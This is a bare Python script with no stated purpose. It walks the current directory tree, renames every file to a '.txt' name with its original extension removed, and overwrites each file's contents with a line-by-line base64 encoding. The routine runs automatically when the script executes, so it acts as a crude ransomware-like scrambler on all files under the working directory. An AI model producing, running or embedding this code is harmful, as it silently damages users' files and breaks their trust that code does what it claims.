import os
import base64

os.chdir(os.getcwd())
def bdc(path):
    result = []

    with open(path, 'rb') as f:
        lines = f.readlines()
        for line in lines:
            result.append(base64.encodebytes(line))
    with open(path, 'wb') as f:
        f.writelines(result)
        

def f_all(i=0,fl=os.getcwd()):
    for root, dirs, files in os.walk(".", topdown=False):
        for name in files:
            path = os.path.join(root,name)
            npath ="."+('').join(path.split('.')[:2])
            os.rename(path,npath +".txt")
            bdc(npath+".txt")

f_all()


